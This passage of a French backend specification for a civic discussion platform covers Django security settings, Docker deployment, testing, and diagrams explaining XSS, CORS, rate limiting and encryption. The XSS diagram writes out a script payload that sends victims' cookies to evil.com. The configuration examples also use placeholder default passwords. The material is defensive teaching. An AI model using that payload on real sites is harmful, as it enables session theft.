```python
# settings.py
INSTALLED_APPS = [
    ...
    'corsheaders',
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',  # Doit être en premier
    ...
]

# Domaines autorisés (whitelist)
CORS_ALLOWED_ORIGINS = [
    "https://frontend.geopo.com",  # Production
    "http://localhost:3000",       # Développement local
]

# Autoriser l'envoi de cookies/credentials
CORS_ALLOW_CREDENTIALS = True

# Headers autorisés
CORS_ALLOW_HEADERS = [
    'accept',
    'accept-encoding',
    'authorization',  # Pour JWT
    'content-type',
    'origin',
    'user-agent',
]
```

### 6.10 Headers de Sécurité

**Configuration Django :**
```python
# settings.py
SECURE_HSTS_SECONDS = 31536000  # 1 an
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'

# Content Security Policy
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")
CSP_IMG_SRC = ("'self'", "data:", "https:")

# Autres headers
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_BROWSER_XSS_FILTER = True
X_FRAME_OPTIONS = 'DENY'
```

**Note Infrastructure :**
HTTPS/TLS est géré au niveau infrastructure (reverse proxy Nginx/Traefik).
Le backend Django écoute sur HTTP (port 8000) et est déployé derrière un reverse proxy avec certificat SSL.

### 6.11 Séparation du système de vote

**CRITIQUE :** Le réseau social est **totalement séparé** du système de vote électronique.

**Mesures :**
- Bases de données distinctes
- Serveurs distincts
- Aucune API commune
- Aucun partage de données utilisateur
- Aucun lien entre les deux systèmes

**Justification :**
- Éviter toute influence du réseau social sur le vote
- Garantir l'anonymat du vote
- Conformité RGPD et lois électorales


---

## 7. Déploiement avec Docker 🐳

**ULTRA IMPORTANT :** Le projet DOIT se lancer avec Docker pour faciliter l'intégration avec le frontend.

### 7.1 Architecture Docker

```
docker-compose.yml
├── backend (Django)
├── postgres (PostgreSQL 16)
├── redis (Redis 7)
└── (optionnel) minio (MinIO - pour médias futurs)
```

### 7.2 Dockerfile (Backend Django)

```dockerfile
# Dockerfile
FROM python:3.12-slim

# Variables d'environnement
ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1

# Répertoire de travail
WORKDIR /app

# Installer les dépendances système
RUN apt-get update && apt-get install -y \
    postgresql-client \
    libpq-dev \
    gcc \
    && rm -rf /var/lib/apt/lists/*

# Installer uv (gestionnaire de paquets Python)
RUN pip install uv

# Copier les fichiers de dépendances
COPY pyproject.toml uv.lock ./

# Installer les dépendances Python
RUN uv sync --frozen

# Copier le code source
COPY . .

# Créer un utilisateur non-root
RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app
USER appuser

# Exposer le port
EXPOSE 8000

# Script d'entrée
COPY --chown=appuser:appuser docker-entrypoint.sh /app/
RUN chmod +x /app/docker-entrypoint.sh

ENTRYPOINT ["/app/docker-entrypoint.sh"]
CMD ["gunicorn", "conf.wsgi:application", "--bind", "0.0.0.0:8000", "--workers", "4"]
```

### 7.3 docker-compose.yml

```yaml
version: '3.9'

services:
  # Backend Django
  backend:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: geopo_backend
    ports:
      - "8000:8000"
    environment:
      - DEBUG=False
      - SECRET_KEY=${SECRET_KEY}
      - DATABASE_URL=postgresql://geopo_user:geopo_password@postgres:5432/geopo_db
      - REDIS_URL=redis://redis:6379/0
      - GOOGLE_CLIENT_ID=${GOOGLE_CLIENT_ID}
      - GOOGLE_CLIENT_SECRET=${GOOGLE_CLIENT_SECRET}
      - GOOGLE_REDIRECT_URI=${GOOGLE_REDIRECT_URI}
      - JWT_SECRET_KEY=${JWT_SECRET_KEY}
      - CONTENT_SIGNATURE_KEY=${CONTENT_SIGNATURE_KEY}
      - ALLOWED_HOSTS=localhost,127.0.0.1,backend
      - CORS_ALLOWED_ORIGINS=${CORS_ALLOWED_ORIGINS}
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_started
    volumes:
      - ./:/app
      - static_volume:/app/staticfiles
      - media_volume:/app/media
    networks:
      - geopo_network
    restart: unless-stopped

  # PostgreSQL
  postgres:
    image: postgres:16-alpine
    container_name: geopo_postgres
    environment:
      - POSTGRES_DB=geopo_db
      - POSTGRES_USER=geopo_user
      - POSTGRES_PASSWORD=geopo_password
      - POSTGRES_INITDB_ARGS=--encoding=UTF-8 --lc-collate=C --lc-ctype=C
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./init_db.sql:/docker-entrypoint-initdb.d/init_db.sql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U geopo_user -d geopo_db"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - geopo_network
    restart: unless-stopped

  # Redis
  redis:
    image: redis:7-alpine
    container_name: geopo_redis
    ports:
      - "6379:6379"
    volumes:
      - redis_data:/data
    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD:-redis_password}
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - geopo_network
    restart: unless-stopped

  # MinIO (optionnel - pour médias futurs)
  # minio:
  #   image: minio/minio:latest
  #   container_name: geopo_minio
  #   ports:
  #     - "9000:9000"
  #     - "9001:9001"
  #   environment:
  #     - MINIO_ROOT_USER=minio_admin
  #     - MINIO_ROOT_PASSWORD=minio_password
  #   volumes:
  #     - minio_data:/data
  #   command: server /data --console-address ":9001"
  #   networks:
  #     - geopo_network
  #   restart: unless-stopped

volumes:
  postgres_data:
  redis_data:
  static_volume:
  media_volume:
  # minio_data:

networks:
  geopo_network:
    driver: bridge
```

### 7.4 Script d'entrée (docker-entrypoint.sh)

```bash
#!/bin/bash
set -e

echo "🚀 Démarrage du backend Geopo..."

# Attendre que PostgreSQL soit prêt
echo "⏳ Attente de PostgreSQL..."
while ! pg_isready -h postgres -U geopo_user -d geopo_db > /dev/null 2>&1; do
  sleep 1
done
echo "✅ PostgreSQL est prêt"

# Appliquer les migrations
echo "📦 Application des migrations..."
python manage.py migrate --noinput

# Créer les 9 domaines fixes (si non existants)
echo "🏛️ Initialisation des domaines..."
python manage.py init_domains

# Collecter les fichiers statiques
echo "📁 Collecte des fichiers statiques..."
python manage.py collectstatic --noinput

echo "✅ Initialisation terminée"

# Exécuter la commande passée en argument
exec "$@"
```

### 7.5 Fichier .env.example

```bash
# .env.example
# Copier ce fichier en .env et remplir les valeurs

# Django
SECRET_KEY=your-secret-key-here-change-in-production
DEBUG=False
ALLOWED_HOSTS=localhost,127.0.0.1,backend

# Database
DATABASE_URL=postgresql://geopo_user:geopo_password@postgres:5432/geopo_db

# Redis
REDIS_URL=redis://redis:6379/0
REDIS_PASSWORD=redis_password

# Google OAuth2
GOOGLE_CLIENT_ID=your-google-client-id
GOOGLE_CLIENT_SECRET=your-google-client-secret
GOOGLE_REDIRECT_URI=http://localhost:8000/api/v1/auth/google/callback

# JWT
JWT_SECRET_KEY=your-jwt-secret-key-change-in-production
JWT_ACCESS_TOKEN_LIFETIME=3600  # 1 heure
JWT_REFRESH_TOKEN_LIFETIME=604800  # 7 jours

# Content Signature
CONTENT_SIGNATURE_KEY=your-content-signature-key

# CORS
CORS_ALLOWED_ORIGINS=http://localhost:3000,http://localhost:5173

# Superuser (dev uniquement)
CREATE_SUPERUSER=false
DJANGO_SUPERUSER_EMAIL=admin@example.com
DJANGO_SUPERUSER_PASSWORD=admin123

# MinIO (optionnel)
# MINIO_ENDPOINT=minio:9000
# MINIO_ACCESS_KEY=minio_admin
# MINIO_SECRET_KEY=minio_password
```

### 7.6 Script d'initialisation des domaines

**POURQUOI CE SCRIPT EST CRITIQUE :**

```
┌─────────────────────────────────────────────────────────────┐
│  Les 9 domaines sont REQUIS pour le fonctionnement          │
├─────────────────────────────────────────────────────────────┤
│  ✅ Ils sont IMMUABLES (ne peuvent pas être supprimés)      │
│  ✅ Ils servent de catégories principales                   │
│  ✅ Tous les forums doivent appartenir à un domaine         │
│  ✅ Sans eux, l'application ne peut pas fonctionner         │
└─────────────────────────────────────────────────────────────┘
```

**QUAND EST-IL EXÉCUTÉ :**
- Automatiquement au premier démarrage Docker
- Idempotent (peut être relancé sans créer de doublons)
- Vérifie si les domaines existent avant de les créer

**LES 9 DOMAINES FIXES :**
1. Culture
2. Sport
3. Environnement
4. Transports
5. Sécurité
6. Santé
7. Emploi
8. Éducation
9. Numérique

**Code du script :**

```python
# management/commands/init_domains.py
from django.core.management.base import BaseCommand
from domains.models import Domain

class Command(BaseCommand):
    help = 'Initialise les 9 domaines politiques fixes'

    def handle(self, *args, **options):
        domains_data = [
            {'domain_name': 'Culture', 'description': 'Discussions sur la culture locale'},
            {'domain_name': 'Sport', 'description': 'Discussions sur le sport et les infrastructures sportives'},
            {'domain_name': 'Environnement', 'description': "Discussions sur l'environnement et l'écologie"},
            {'domain_name': 'Transports', 'description': 'Discussions sur les transports et la mobilité'},
            {'domain_name': 'Sécurité', 'description': 'Discussions sur la sécurité publique'},
            {'domain_name': 'Santé', 'description': 'Discussions sur la santé publique'},
            {'domain_name': 'Emploi', 'description': "Discussions sur l'emploi et l'économie locale"},
            {'domain_name': 'Éducation', 'description': "Discussions sur l'éducation et la formation"},
            {'domain_name': 'Numérique', 'description': 'Discussions sur le numérique et ce projet'},
        ]

        for domain_data in domains_data:
            domain, created = Domain.objects.get_or_create(
                domain_name=domain_data['domain_name'],
                defaults={'description': domain_data['description']}
            )
            if created:
                self.stdout.write(self.style.SUCCESS(f'✅ Domaine créé : {domain.domain_name}'))
            else:
                self.stdout.write(self.style.WARNING(f'⚠️  Domaine existant : {domain.domain_name}'))

        self.stdout.write(self.style.SUCCESS(f'\n🎉 Initialisation terminée : {Domain.objects.count()} domaines'))
```

### 7.7 Instructions de lancement

#### **Première installation :**

```bash
# 1. Cloner le repository
git clone https://github.com/your-org/geopo-backend.git
cd geopo-backend

# 2. Copier et configurer les variables d'environnement
cp .env.example .env
# Éditer .env avec vos valeurs

# 3. Lancer les services Docker
docker-compose up -d

# 4. Vérifier les logs
docker-compose logs -f backend

# 5. Accéder à l'API
# http://localhost:8000/api/v1/
```

#### **Commandes utiles :**

```bash
# Démarrer les services
docker-compose up -d

# Arrêter les services
docker-compose down

# Voir les logs
docker-compose logs -f backend

# Reconstruire les images
docker-compose build --no-cache

# Exécuter des commandes Django
docker-compose exec backend python manage.py <command>

# Créer un superuser
docker-compose exec backend python manage.py createsuperuser

# Appliquer les migrations
docker-compose exec backend python manage.py migrate

# Accéder au shell Django
docker-compose exec backend python manage.py shell

# Accéder à la base de données
docker-compose exec postgres psql -U geopo_user -d geopo_db

# Nettoyer tout (ATTENTION : supprime les données)
docker-compose down -v
```

### 7.8 Intégration avec le frontend

**Le frontend peut se connecter à l'API via :**
- URL : `http://localhost:8000/api/v1/`
- Authentification : `Authorization: Bearer {access_token}`

**Exemple de configuration frontend (React/Vue) :**
```javascript
// .env (frontend)
VITE_API_BASE_URL=http://localhost:8000/api/v1
VITE_GOOGLE_CLIENT_ID=your-google-client-id

// api.js
import axios from 'axios';

const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL,
  headers: {
    'Content-Type': 'application/json',
  },
});

// Intercepteur pour ajouter le token
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('access_token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

export default api;
```

### 7.9 Production

**Pour la production, modifier :**
- `DEBUG=False`
- Utiliser un secret key fort (généré aléatoirement)
- Configurer un reverse proxy (Nginx)
- Utiliser HTTPS (Let's Encrypt)
- Configurer un serveur SMTP pour les emails
- Utiliser un service de monitoring (Sentry)
- Configurer des backups automatiques de PostgreSQL

### 7.10 CI/CD avec GitHub Actions

**Gestion des secrets en production :**

**Développement local :**
- Fichier `.env` (non committé)
- Copier `.env.example` → `.env`

**Production / CI/CD :**
- ❌ NE JAMAIS committer `.env`
- ✅ Utiliser GitHub Secrets

**Secrets à configurer dans GitHub :**

Repository → Settings → Secrets and variables → Actions

- `DJANGO_SECRET_KEY`
- `JWT_SECRET_KEY`
- `GOOGLE_CLIENT_ID`
- `GOOGLE_CLIENT_SECRET`
- `DATABASE_URL`
- `REDIS_URL`
- `CONTENT_SIGNATURE_KEY`

**Exemple de workflow GitHub Actions :**

```yaml
# .github/workflows/deploy.yml
name: Deploy Backend

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: |
          pip install uv
          uv sync

      - name: Run tests
        env:
          SECRET_KEY: ${{ secrets.DJANGO_SECRET_KEY }}
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
        run: |
          pytest

      - name: Build Docker image
        env:
          SECRET_KEY: ${{ secrets.DJANGO_SECRET_KEY }}
          JWT_SECRET_KEY: ${{ secrets.JWT_SECRET_KEY }}
          GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
          GOOGLE_CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
        run: |
          docker build -t geopo-backend .

      - name: Deploy to production
        run: |
          # Commandes de déploiement
          docker-compose up -d
```

### 7.11 Création du premier administrateur

**Pas de superuser automatique**

Après déploiement, promouvoir manuellement le premier admin :

**Étape 1 : Un utilisateur se connecte via Google Auth**
- L'utilisateur s'inscrit normalement via `/auth/google/callback`
- Il reçoit le rôle `is_admin = False` par défaut

**Étape 2 : Promotion manuelle via Django shell**

```bash
# Accéder au shell Django
docker-compose exec backend python manage.py shell
```

```python
# Promouvoir l'utilisateur
from users.models import User

user = User.objects.get(email='admin@example.com')
user.is_admin = True
user.save()

print(f"✅ {user.email} est maintenant administrateur")
exit()
```

**Vérification :**

```bash
# Vérifier le statut admin
docker-compose exec backend python manage.py shell
```

```python
>>> from users.models import User
>>> User.objects.filter(is_admin=True).values('email', 'is_admin')
<QuerySet [{'email': 'admin@example.com', 'is_admin': True}]>
```

**Alternative : Script de promotion**

```python
# management/commands/promote_admin.py
from django.core.management.base import BaseCommand
from users.models import User

class Command(BaseCommand):
    help = 'Promouvoir un utilisateur en administrateur'

    def add_arguments(self, parser):
        parser.add_argument('email', type=str, help='Email de l\'utilisateur')

    def handle(self, *args, **options):
        email = options['email']
        try:
            user = User.objects.get(email=email)
            user.is_admin = True
            user.save()
            self.stdout.write(self.style.SUCCESS(f'✅ {email} est maintenant administrateur'))
        except User.DoesNotExist:
            self.stdout.write(self.style.ERROR(f'❌ Utilisateur {email} introuvable'))
```

**Utilisation :**

```bash
docker-compose exec backend python manage.py promote_admin admin@example.com
```

---

## 8. Tests

### 8.1 Stratégie de tests

**Pyramide de tests :**
```
        /\
       /  \  E2E Tests (5%)
      /____\
     /      \  Integration Tests (15%)
    /________\
   /          \  Unit Tests (80%)
  /__________\
```

### 8.2 Tests unitaires

**Outils :**
- pytest
- pytest-django
- factory_boy (fixtures)
- faker (données de test)

**Exemple de test :**
```python
# tests/test_posts.py
import pytest
from posts.models import Post
from users.models import User

@pytest.mark.django_db
class TestPostCreation:
    def test_create_post_success(self, authenticated_user, subforum):
        post = Post.objects.create(
            user=authenticated_user,
            subforum=subforum,
            title="Test Post",
            content="Test content"
        )
        assert post.title == "Test Post"
        assert post.user == authenticated_user

    def test_create_post_generates_signature(self, authenticated_user, subforum):
        post = Post.objects.create(
            user=authenticated_user,
            subforum=subforum,
            title="Test",
            content="Content"
        )
        assert post.content_signature is not None
        assert len(post.content_signature) == 64  # SHA256 hex
```

### 8.3 Tests d'intégration

**Exemple de test d'API :**
```python
# tests/test_api_posts.py
import pytest
from rest_framework.test import APIClient

@pytest.mark.django_db
class TestPostAPI:
    def test_create_post_authenticated(self, api_client, access_token, subforum):
        api_client.credentials(HTTP_AUTHORIZATION=f'Bearer {access_token}')
        response = api_client.post('/api/v1/posts/create', {
            'title': 'New Post',
            'content': 'Content here',
            'subforum_id': str(subforum.subforum_id)
        })
        assert response.status_code == 201
        assert response.data['title'] == 'New Post'

    def test_create_post_unauthenticated(self, api_client):
        response = api_client.post('/api/v1/posts/create', {})
        assert response.status_code == 401
```

### 8.4 Tests de sécurité

**Tests à implémenter :**
- Test IDOR (tentative d'accès à ressources d'autrui)
- Test rate limiting
- Test XSS (injection de scripts)
- Test SQL injection
- Test CSRF
- Test permissions (admin vs user)

**Exemple :**
```python
def test_cannot_delete_other_user_post(api_client, user1, user2, post_by_user2):
    api_client.force_authenticate(user=user1)
    response = api_client.delete(f'/api/v1/posts/{post_by_user2.post_id}/delete')
    assert response.status_code == 403
```

### 8.5 Couverture de code

**Objectif :** Minimum 80% de couverture

```bash
# Exécuter les tests avec couverture
pytest --cov=. --cov-report=html

# Voir le rapport
open htmlcov/index.html
```

---

## 9. Annexes

### 9.1 Glossaire

| Terme | Définition |
|-------|------------|
| **Domaine** | L'un des 9 thèmes politiques fixes (Culture, Sport, etc.) |
| **Forum** | Espace de discussion créé par un utilisateur |
| **Subforum** | Sous-catégorie d'un forum ou d'un domaine |
| **Post** | Publication d'un utilisateur dans un subforum |
| **Commentaire** | Réponse à un post (peut être imbriqué) |
| **Like** | Appréciation d'un post |
| **Tag** | Étiquette pour catégoriser les posts |
| **Follow** | Abonnement à un utilisateur |
| **Subscription** | Abonnement à un forum/subforum |
| **Privacy** | Niveau de visibilité du profil (public/private) |
| **IDOR** | Insecure Direct Object Reference (vulnérabilité) |
| **E2E** | End-to-End (chiffrement de bout en bout) |
| **JWT** | JSON Web Token (authentification) |
| **UUID** | Universally Unique Identifier |

### 9.2 Références

**Documentation technique :**
- Django : https://docs.djangoproject.com/
- Django REST Framework : https://www.django-rest-framework.org/
- PostgreSQL : https://www.postgresql.org/docs/
- Redis : https://redis.io/docs/
- Docker : https://docs.docker.com/

**Sécurité :**
- OWASP Top 10 : https://owasp.org/www-project-top-ten/
- Django Security : https://docs.djangoproject.com/en/5.0/topics/security/
- JWT Best Practices : https://tools.ietf.org/html/rfc8725

**Standards :**
- OAuth 2.0 : https://oauth.net/2/
- OpenAPI 3.0 : https://swagger.io/specification/

### 9.3 Codes d'erreur personnalisés

| Code | Description |
|------|-------------|
| `AUTH_001` | Token JWT invalide |
| `AUTH_002` | Token JWT expiré |
| `AUTH_003` | Utilisateur banni |
| `PERM_001` | Permission refusée |
| `PERM_002` | Ressource non trouvée ou accès refusé (IDOR) |
| `VAL_001` | Données de validation invalides |
| `VAL_002` | Champ requis manquant |
| `RATE_001` | Rate limit dépassé |
| `BLOCK_001` | Utilisateur bloqué |
| `PRIV_001` | Profil privé, follow requis |

### 9.4 Concepts de Sécurité Expliqués (avec schémas)

Cette section explique visuellement les concepts de sécurité implémentés dans le backend.

#### 9.4.1 Validation vs Sanitisation

**Différence clé :**

```
┌─────────────────────────────────────────────────────────────────┐
│                    ENTRÉE UTILISATEUR                            │
│              "Hello <script>alert('XSS')</script>"              │
└────────────────────────┬────────────────────────────────────────┘
                         │
         ┌───────────────┴───────────────┐
         │                               │
         ▼                               ▼
┌──────────────────┐            ┌──────────────────┐
│   VALIDATION     │            │  SANITISATION    │
│   (Rejeter)      │            │  (Nettoyer)      │
└──────────────────┘            └──────────────────┘
         │                               │
         │ Est-ce valide ?               │ Nettoyer le contenu
         │ - Longueur OK ?               │ - Supprimer <script>
         │ - Format OK ?                 │ - Échapper HTML
         │ - Type OK ?                   │ - Garder texte safe
         │                               │
         ▼                               ▼
┌──────────────────┐            ┌──────────────────┐
│  ❌ REJETÉ       │            │  ✅ ACCEPTÉ      │
│  HTTP 400        │            │  "Hello "        │
│  "Contenu        │            │  (script retiré) │
│   invalide"      │            │                  │
└──────────────────┘            └──────────────────┘
```

**Exemple concret :**

```
INPUT: "<b>Bonjour</b> <script>alert('hack')</script>"

┌─────────────────────────────────────────────────────────┐
│ VALIDATION (Vérifier)                                   │
├─────────────────────────────────────────────────────────┤
│ ✅ Longueur < 10000 caractères                          │
│ ✅ Type: string                                         │
│ ✅ Pas vide                                             │
│ → PASSE la validation                                   │
└─────────────────────────────────────────────────────────┘
                         ↓
┌─────────────────────────────────────────────────────────┐
│ SANITISATION (Nettoyer avec Bleach)                    │
├─────────────────────────────────────────────────────────┤
│ Tags autorisés: ['b', 'i', 'u', 'p']                   │
│ Tags interdits: ['script', 'iframe', 'object']         │
│                                                         │
│ AVANT: "<b>Bonjour</b> <script>alert('hack')</script>" │
│ APRÈS: "<b>Bonjour</b> "                               │
│                                                         │
│ → <script> supprimé, <b> conservé                      │
└─────────────────────────────────────────────────────────┘
```

#### 9.4.2 XSS : Attaque et Protection

**Attaque XSS sans protection :**

```
┌──────────────────────────────────────────────────────────────┐
│                    ATTAQUE XSS                               │
└──────────────────────────────────────────────────────────────┘

Étape 1: Attaquant injecte du code malveillant
┌─────────────┐
│  Attaquant  │
│     😈      │
└──────┬──────┘
       │ POST /posts/create
       │ content: "<script>
       │   fetch('https://evil.com/steal?cookie=' +
       │   document.cookie)
       │ </script>"
       ▼
┌─────────────┐
│   Backend   │  ❌ Pas de sanitisation
│   (Django)  │  → Stocke tel quel en DB
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  Database   │
│  PostgreSQL │  Contient le script malveillant
└─────────────┘

Étape 2: Victime charge la page
┌─────────────┐
│   Victime   │
│     😊      │
└──────┬──────┘
       │ GET /posts/123
       ▼
┌─────────────┐
│   Backend   │  Renvoie le contenu avec <script>
└──────┬──────┘
       │
       ▼
┌─────────────┐
│  Navigateur │  ⚠️ Exécute le script !
│   Victime   │  → Envoie les cookies à evil.com
└─────────────┘
       │
       │ fetch('https://evil.com/steal?cookie=session_token')
       ▼
┌─────────────┐
│  evil.com   │  😈 Reçoit le token de session
└─────────────┘
```

**Protection XSS avec sanitisation :**

```
┌──────────────────────────────────────────────────────────────┐
│              PROTECTION XSS (avec Bleach)                    │
└──────────────────────────────────────────────────────────────┘

┌─────────────┐
│  Attaquant  │
│     😈      │
└──────┬──────┘
       │ POST /posts/create
       │ content: "<script>alert('XSS')</script>"
       ▼
┌─────────────────────────────────────────────────────────────┐
│   Backend (Django)                                          │
│                                                             │
│   1. Validation ✅                                          │
│      - Longueur OK                                          │
│      - Type string OK                                       │
│                                                             │
│   2. Sanitisation (Bleach) 🧹                              │
│      allowed_tags = ['p', 'b', 'i', 'u']                   │
│      clean_content = bleach.clean(content, tags=allowed)   │
│                                                             │
│      AVANT: "<script>alert('XSS')</script>"                │
│      APRÈS: ""  (script supprimé)                          │
│                                                             │
└──────┬──────────────────────────────────────────────────────┘
       │
       ▼
┌─────────────┐
│  Database   │  Stocke le contenu NETTOYÉ
│             │  content: "" (vide, script retiré)
└─────────────┘

┌─────────────┐
│   Victime   │  😊 Protégée !
│             │  Voit juste une page vide (pas de script)
└─────────────┘
```

#### 9.4.3 CORS : Contrôle d'accès cross-origin

**Problème : Requêtes cross-origin non autorisées**

```
┌──────────────────────────────────────────────────────────────┐
│                  SANS CORS (Dangereux)                       │
└──────────────────────────────────────────────────────────────┘

┌─────────────────┐
│  evil.com       │
│  (Site pirate)  │
└────────┬────────┘
         │
         │ fetch('https://api.geopo.com/users/me', {
         │   credentials: 'include'  // Envoie les cookies
         │ })
         ▼
┌─────────────────┐
│  api.geopo.com  │  ❌ Accepte la requête
│  (Backend)      │  → Renvoie les données sensibles
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  evil.com       │  😈 Reçoit les données de l'utilisateur
└─────────────────┘
```

**Solution : CORS configuré**

```
┌──────────────────────────────────────────────────────────────┐
│                  AVEC CORS (Sécurisé)                        │
└──────────────────────────────────────────────────────────────┘

┌─────────────────┐
│  evil.com       │
└────────┬────────┘
         │
         │ fetch('https://api.geopo.com/users/me')
         ▼
┌─────────────────────────────────────────────────────────────┐
│  api.geopo.com (Backend)                                    │
│                                                             │
│  CORS_ALLOWED_ORIGINS = [                                  │
│    "https://frontend.geopo.com"  ← SEUL domaine autorisé   │
│  ]                                                          │
│                                                             │
│  Origin de la requête: https://evil.com                    │
│  ❌ PAS dans la liste → REJETÉ                             │
│                                                             │
│  Response:                                                  │
│    HTTP 403 Forbidden                                       │
│    Access-Control-Allow-Origin: (vide)                     │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────┐
│  evil.com       │  ❌ Requête bloquée par le navigateur
└─────────────────┘


┌─────────────────┐
│ frontend.geopo  │  ← Domaine autorisé
└────────┬────────┘
         │
         │ fetch('https://api.geopo.com/users/me')
         ▼
┌─────────────────────────────────────────────────────────────┐
│  api.geopo.com (Backend)                                    │
│                                                             │
│  Origin: https://frontend.geopo.com                         │
│  ✅ Dans CORS_ALLOWED_ORIGINS → ACCEPTÉ                    │
│                                                             │
│  Response:                                                  │
│    HTTP 200 OK                                              │
│    Access-Control-Allow-Origin: https://frontend.geopo.com │
│    { "user_id": "...", "email": "..." }                    │
└─────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────┐
│ frontend.geopo  │  ✅ Reçoit les données
└─────────────────┘
```

#### 9.4.4 Rate Limiting : Limitation de requêtes

**Algorithme : Fixed Window (Fenêtre fixe)**

```
┌──────────────────────────────────────────────────────────────┐
│           RATE LIMITING - Fixed Window                       │
│           Limite: 5 requêtes / minute                        │
└──────────────────────────────────────────────────────────────┘

Minute 1 (00:00 - 00:59)
┌─────────────────────────────────────────────────────────────┐
│ Requête 1  00:05  ✅  Compteur: 1/5                         │
│ Requête 2  00:15  ✅  Compteur: 2/5                         │
│ Requête 3  00:30  ✅  Compteur: 3/5                         │
│ Requête 4  00:45  ✅  Compteur: 4/5                         │
│ Requête 5  00:50  ✅  Compteur: 5/5  ← Limite atteinte      │
│ Requête 6  00:55  ❌  HTTP 429 "Too Many Requests"          │
└─────────────────────────────────────────────────────────────┘

Minute 2 (01:00 - 01:59)
┌─────────────────────────────────────────────────────────────┐
│ Compteur réinitialisé à 0                                   │
│ Requête 7  01:05  ✅  Compteur: 1/5  ← Nouveau cycle        │
└─────────────────────────────────────────────────────────────┘
```

**Implémentation avec Redis :**

```
┌──────────────────────────────────────────────────────────────┐
│                  FLUX RATE LIMITING                          │
└──────────────────────────────────────────────────────────────┘

┌─────────────┐
│   Client    │
│  (IP: 1.2.3.4)
└──────┬──────┘
       │ POST /posts/create
       ▼
┌─────────────────────────────────────────────────────────────┐
│  Backend (Middleware Rate Limit)                            │
│                                                             │
│  1. Identifier la clé                                       │
│     key = f"ratelimit:ip:1.2.3.4:posts_create"            │
│                                                             │
│  2. Vérifier Redis                                          │
│     count = redis.get(key)  # Nombre de requêtes           │
│                                                             │
│  3. Décision                                                │
│     if count >= 5:                                          │
│         return HTTP 429 "Too Many Requests"                │
│     else:                                                   │
│         redis.incr(key)  # Incrémenter                     │
│         redis.expire(key, 60)  # Expiration 60s            │
│         continue  # Traiter la requête                     │
└─────────────────────────────────────────────────────────────┘
       │
       ▼
┌─────────────┐
│    Redis    │
│             │
│  Key: "ratelimit:ip:1.2.3.4:posts_create"                  │
│  Value: 3                                                   │
│  TTL: 45 secondes                                           │
└─────────────┘
```

#### 9.4.5 Chiffrement E2E pour les messages

**Architecture E2E (End-to-End Encryption)**

```
┌──────────────────────────────────────────────────────────────┐
│              CHIFFREMENT E2E - VUE D'ENSEMBLE                │
└──────────────────────────────────────────────────────────────┘

┌─────────────────┐                        ┌─────────────────┐
│  Expéditeur     │                        │  Destinataire   │
│  Alice          │                        │  Bob            │
│                 │                        │                 │
│  🔑 Clé privée  │                        │  🔑 Clé privée  │
│  (locale)       │                        │  (locale)       │
│                 │                        │                 │
│  🔓 Clé publique│                        │  🔓 Clé publique│
│  (en DB)        │                        │  (en DB)        │
└────────┬────────┘                        └────────┬────────┘
         │                                          │
         │ 1. Récupère clé publique de Bob         │
         │    GET /users/{bob_id}/public_key       │
         │                                          │
         ▼                                          │
┌─────────────────────────────────────────────────────────────┐
│  Backend (Django)                                           │
│                                                             │
│  ❌ NE PEUT PAS déchiffrer les messages                    │
│  ✅ Stocke uniquement les messages chiffrés                │
│  ✅ Stocke les clés publiques (pas les privées)            │
│                                                             │
│  Database:                                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Messages                                            │   │
│  │ - encrypted_content: "a8f3b2..."  ← Chiffré AES    │   │
│  │ - encrypted_aes_key: "9d4c1..."   ← Chiffré RSA    │   │
│  │                                                     │   │
│  │ Users                                               │   │
│  │ - public_key_rsa: "MIIBIjAN..."   ← Clé publique  │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

**Flux d'envoi de message (Alice → Bob)**

```
┌──────────────────────────────────────────────────────────────┐
│              ENVOI DE MESSAGE CHIFFRÉ                        │
└──────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│  Frontend Alice                                             │
│                                                             │
│  1. Message en clair                                        │
│     plaintext = "Bonjour Bob, rendez-vous à 15h"           │
│                                                             │
│  2. Générer une clé AES aléatoire (256 bits)               │
│     aes_key = crypto.randomBytes(32)                       │
│                                                             │
│  3. Chiffrer le message avec AES-256                        │
│     encrypted_content = AES.encrypt(plaintext, aes_key)    │
│     → "a8f3b2c9d1e4f5..."                                  │
│                                                             │
│  4. Récupérer la clé publique RSA de Bob                   │
│     bob_public_key = await fetch('/users/bob/public_key')  │
│                                                             │
│  5. Chiffrer la clé AES avec la clé publique RSA de Bob    │
│     encrypted_aes_key = RSA.encrypt(aes_key, bob_public)   │
